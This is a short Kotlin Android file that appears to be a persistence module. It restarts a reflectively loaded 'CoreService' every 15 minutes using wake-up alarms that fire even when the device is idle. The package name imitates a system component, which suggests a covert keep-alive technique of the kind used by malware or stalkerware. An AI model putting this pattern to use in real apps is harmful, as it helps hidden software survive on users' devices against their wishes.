// [context: Kotlin, Android API 26+, AlarmManager exact alarm persistence]
package com.system.service.persistence

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock

class AlarmReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val svc = Intent(context, Class.forName("com.system.service.core.CoreService"))
        context.startForegroundService(svc)
        AlarmManagerHook(context).scheduleAlarm()
    }
}

class AlarmManagerHook(private val context: Context) {

    private val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
    private val INTERVAL = 15 * 60 * 1000L

    fun scheduleAlarm() {
        val intent = Intent(context, AlarmReceiver::class.java)
        val pi = PendingIntent.getBroadcast(
            context, 0xA1, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val trigger = SystemClock.elapsedRealtime() + INTERVAL
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi)
            } else {
                alarmManager.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi)
            }
        } catch (_: SecurityException) {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi)
        }
    }
}
